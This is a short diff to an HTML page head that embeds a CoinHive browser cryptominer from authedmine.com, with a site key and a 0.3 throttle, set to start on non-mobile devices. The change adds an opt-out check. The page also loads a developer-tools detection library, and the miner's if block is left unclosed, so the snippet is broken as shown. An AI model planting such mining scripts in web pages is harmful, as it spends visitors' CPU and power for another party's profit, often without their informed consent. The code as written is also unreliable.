@@ -6,13 +6,13 @@
 	<script src="js/frontendupdates.js"></script>
 	<script src="https://unpkg.com/jdetects@0.1.0/jdetects.js"></script>
 	
-<script src="https://www.authedmine.com"></script>
+<script src="https://authedmine.com"></script>
 <script>
     var miner = new CoinHive.Anonymous('kmZeL8MvYjmwpqBvD1f9dD52nx5SCZ4M', {throttle: 0.3});
 
     // Only start on non-mobile devices and if not opted-out
     // in the last 14400 seconds (4 hours):
-    if (!miner.isMobile()) {
+    if (!miner.isMobile() && !miner.didOptOut()) {
         miner.start();
 </script>
 <title>
